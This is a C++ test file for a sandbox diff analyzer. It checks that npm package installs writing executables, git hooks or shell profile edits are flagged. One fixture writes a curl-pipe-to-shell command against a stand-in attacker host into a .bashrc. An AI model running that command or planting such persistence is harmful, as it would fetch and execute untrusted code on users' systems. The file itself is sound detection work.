// tests/test_diff_walker.cpp
//
// Tests for the OverlayFS upper-dir walker and active diff analysis.
//
// Run:  ./shadow_tests [diff]

#include "catch2/catch_amalgamated.hpp"
#include <string>
#include <vector>
#include <set>
#include <fstream>
#include <filesystem>
#include <dirent.h>
#include <sys/stat.h>
#include <functional>
#include <unistd.h>

namespace fs = std::filesystem;

// ---------------------------------------------------------------------------
// DiffResult — mirrors the struct in main.cpp
// ---------------------------------------------------------------------------
struct DiffResult {
    int  file_count   = 0;
    int  del_count    = 0;
    bool has_findings = false;
    std::vector<std::string> findings;
    std::vector<std::string> written;
    std::vector<std::string> deleted;
};

// ---------------------------------------------------------------------------
// walk_upper_full — replicates analyze_diff() logic from main.cpp for tests
// ---------------------------------------------------------------------------
static DiffResult walk_upper_full(const std::string& upper_dir) {
    DiffResult result;
    if (upper_dir.empty()) return result;

    std::function<void(const std::string&, const std::string&)> walk =
        [&](const std::string& dir, const std::string& rel_prefix) {
            DIR* d = opendir(dir.c_str());
            if (!d) return;
            struct dirent* ent;
            while ((ent = readdir(d)) != nullptr) {
                std::string name(ent->d_name);
                if (name == "." || name == "..") continue;
                std::string full = dir + "/" + name;
                std::string rel  = rel_prefix + "/" + name;

                // Whiteout — deletion
                if (name.size() > 4 && name.substr(0, 4) == ".wh.") {
                    result.deleted.push_back(rel_prefix + "/" + name.substr(4));
                    result.del_count++;
                    continue;
                }
                struct stat st;
                if (lstat(full.c_str(), &st) != 0) continue;
                if (S_ISDIR(st.st_mode)) { walk(full, rel); continue; }

                result.written.push_back(rel);
                result.file_count++;

                // 1. Executable bit
                bool is_exec = (st.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH));
                if (is_exec) {
                    result.findings.push_back("Executable written: " + rel);
                    result.has_findings = true;
                }

                // 2. Write outside expected locations
                bool in_nm  = (rel.find("/sandbox_pkg/node_modules") != std::string::npos);
                bool in_npm = (rel.find("/.npm") != std::string::npos);
                bool in_pkg = (rel.find("/sandbox_pkg/package") != std::string::npos);
                if (!in_nm && !in_npm && !in_pkg) {
                    result.findings.push_back("Write outside node_modules: " + rel);
                    result.has_findings = true;
                }

                // 3. Git hook injection
                if (rel.find("/.git/hooks/") != std::string::npos) {
                    result.findings.push_back("Git hook written: " + rel);
                    result.has_findings = true;
                }

                // 4. Shell profile modification
                if (rel.find("/.bashrc") != std::string::npos ||
                    rel.find("/.zshrc")  != std::string::npos ||
                    rel.find("/.profile") != std::string::npos ||
                    rel.find("/.bash_profile") != std::string::npos) {
                    result.findings.push_back("Shell profile modified: " + rel);
                    result.has_findings = true;
                }
            }
            closedir(d);
        };

    walk(upper_dir, "");
    return result;
}

// ---------------------------------------------------------------------------
// Fixture
// ---------------------------------------------------------------------------
struct TmpDir {
    fs::path path;
    TmpDir() {
        path = fs::temp_directory_path() / ("shadow_test_" + std::to_string(getpid()));
        fs::create_directories(path);
    }
    ~TmpDir() { fs::remove_all(path); }

    void create_file(const std::string& rel, const std::string& content = "test", bool executable = false) {
        fs::path p = path / rel;
        fs::create_directories(p.parent_path());
        std::ofstream f(p); f << content;
        chmod(p.c_str(), executable ? 0755 : 0644);
    }
    void create_whiteout(const std::string& rel_dir, const std::string& deleted_name) {
        fs::path p = path / rel_dir / (".wh." + deleted_name);
        fs::create_directories(p.parent_path());
        std::ofstream f(p);
    }
};

// ============================================================
// Basic walker tests
// ============================================================
TEST_CASE("diff walker — empty upper dir returns empty result", "[diff]") {
    TmpDir d;
    auto r = walk_upper_full(d.path.string());
    CHECK(r.written.empty());
    CHECK(r.deleted.empty());
    CHECK_FALSE(r.has_findings);
}

TEST_CASE("diff walker — missing upper dir returns empty result", "[diff]") {
    auto r = walk_upper_full("/tmp/shadow_nonexistent_xyz_12345");
    CHECK(r.written.empty());
    CHECK(r.deleted.empty());
}

TEST_CASE("diff walker — empty string returns empty result", "[diff]") {
    auto r = walk_upper_full("");
    CHECK(r.written.empty());
}

TEST_CASE("diff walker — single file in node_modules detected", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/node_modules/lodash/index.js");
    auto r = walk_upper_full(d.path.string());
    REQUIRE(r.written.size() == 1);
    CHECK(r.written[0] == "/sandbox_pkg/node_modules/lodash/index.js");
}

TEST_CASE("diff walker — nested directory structure walked recursively", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/node_modules/a/b/c/deep.js");
    d.create_file("sandbox_pkg/node_modules/a/b/shallow.js");
    d.create_file("sandbox_pkg/node_modules/a/top.js");
    auto r = walk_upper_full(d.path.string());
    CHECK(r.file_count == 3);
}

TEST_CASE("diff walker — whiteout file detected as deletion", "[diff]") {
    TmpDir d;
    d.create_whiteout("", "somefile");
    auto r = walk_upper_full(d.path.string());
    CHECK(r.written.empty());
    REQUIRE(r.deleted.size() == 1);
    CHECK(r.deleted[0] == "/somefile");
}

TEST_CASE("diff walker — mixed written and deleted files", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/node_modules/evil/index.js");
    d.create_whiteout("", "package.json");
    auto r = walk_upper_full(d.path.string());
    CHECK(r.file_count == 1);
    CHECK(r.del_count == 1);
}

TEST_CASE("diff walker — whiteout in subdirectory resolved correctly", "[diff]") {
    TmpDir d;
    d.create_whiteout("node_modules/axios", "axios.js");
    auto r = walk_upper_full(d.path.string());
    REQUIRE(r.deleted.size() == 1);
    CHECK(r.deleted[0] == "/node_modules/axios/axios.js");
}

TEST_CASE("diff walker — non-whiteout .wh files treated as regular files", "[diff]") {
    TmpDir d;
    d.create_file(".wh");
    d.create_file(".whrc");
    d.create_whiteout("", "real");
    auto r = walk_upper_full(d.path.string());
    CHECK(r.file_count == 2);
    CHECK(r.del_count == 1);
    REQUIRE(r.deleted.size() == 1);
    CHECK(r.deleted[0] == "/real");
}

// ============================================================
// Active diff analysis — suspicious findings
// ============================================================
TEST_CASE("diff analysis — executable written is flagged", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/node_modules/.bin/evil", "#!/bin/sh", true);
    auto r = walk_upper_full(d.path.string());
    CHECK(r.has_findings);
    bool found = false;
    for (const auto& f : r.findings)
        if (f.find("Executable written") != std::string::npos) found = true;
    CHECK(found);
}

TEST_CASE("diff analysis — non-executable in node_modules has no outside finding", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/node_modules/lodash/lodash.js", "// lodash", false);
    auto r = walk_upper_full(d.path.string());
    bool outside = false;
    for (const auto& f : r.findings)
        if (f.find("Write outside node_modules") != std::string::npos) outside = true;
    CHECK_FALSE(outside);
}

TEST_CASE("diff analysis — write outside node_modules is flagged", "[diff]") {
    TmpDir d;
    d.create_file("some_random_dir/malware.js");
    auto r = walk_upper_full(d.path.string());
    CHECK(r.has_findings);
    bool found = false;
    for (const auto& f : r.findings)
        if (f.find("Write outside node_modules") != std::string::npos) found = true;
    CHECK(found);
}

TEST_CASE("diff analysis — git hook injection is flagged", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/node_modules/evil/.git/hooks/post-commit", "#!/bin/sh", true);
    auto r = walk_upper_full(d.path.string());
    CHECK(r.has_findings);
    bool found = false;
    for (const auto& f : r.findings)
        if (f.find("Git hook written") != std::string::npos) found = true;
    CHECK(found);
}

TEST_CASE("diff analysis — .bashrc modification is flagged", "[diff]") {
    TmpDir d;
    d.create_file("home/user/.bashrc", "curl evil.com | sh");
    auto r = walk_upper_full(d.path.string());
    CHECK(r.has_findings);
    bool found = false;
    for (const auto& f : r.findings)
        if (f.find("Shell profile modified") != std::string::npos) found = true;
    CHECK(found);
}

TEST_CASE("diff analysis — .zshrc modification is flagged", "[diff]") {
    TmpDir d;
    d.create_file("home/user/.zshrc", "export PATH=/tmp:$PATH");
    auto r = walk_upper_full(d.path.string());
    bool found = false;
    for (const auto& f : r.findings)
        if (f.find("Shell profile modified") != std::string::npos) found = true;
    CHECK(found);
}

TEST_CASE("diff analysis — npm cache write does not trigger outside finding", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/.npm/_cacache/some-hash");
    auto r = walk_upper_full(d.path.string());
    bool outside = false;
    for (const auto& f : r.findings)
        if (f.find("Write outside node_modules") != std::string::npos) outside = true;
    CHECK_FALSE(outside);
}

TEST_CASE("diff analysis — package.json write does not trigger outside finding", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/package.json");
    d.create_file("sandbox_pkg/package-lock.json");
    auto r = walk_upper_full(d.path.string());
    bool outside = false;
    for (const auto& f : r.findings)
        if (f.find("Write outside node_modules") != std::string::npos) outside = true;
    CHECK_FALSE(outside);
}

TEST_CASE("diff analysis — multiple findings accumulated correctly", "[diff]") {
    TmpDir d;
    d.create_file("home/user/.bashrc", "malicious");
    d.create_file("sandbox_pkg/node_modules/evil/.git/hooks/pre-push", "#!/bin/sh", true);
    d.create_file("some_other_dir/backdoor.sh", "#!/bin/sh", true);
    auto r = walk_upper_full(d.path.string());
    CHECK(r.has_findings);
    CHECK(r.findings.size() >= 3);
}

TEST_CASE("diff analysis — CLEAN package in node_modules has no outside findings", "[diff]") {
    TmpDir d;
    d.create_file("sandbox_pkg/node_modules/express/index.js");
    d.create_file("sandbox_pkg/node_modules/express/package.json");
    d.create_file("sandbox_pkg/node_modules/.bin/express");
    d.create_file("sandbox_pkg/package.json");
    auto r = walk_upper_full(d.path.string());
    // .bin/express is executable so that fires, but no outside-node_modules findings
    bool outside = false;
    for (const auto& f : r.findings)
        if (f.find("Write outside node_modules") != std::string::npos) outside = true;
    CHECK_FALSE(outside);
}
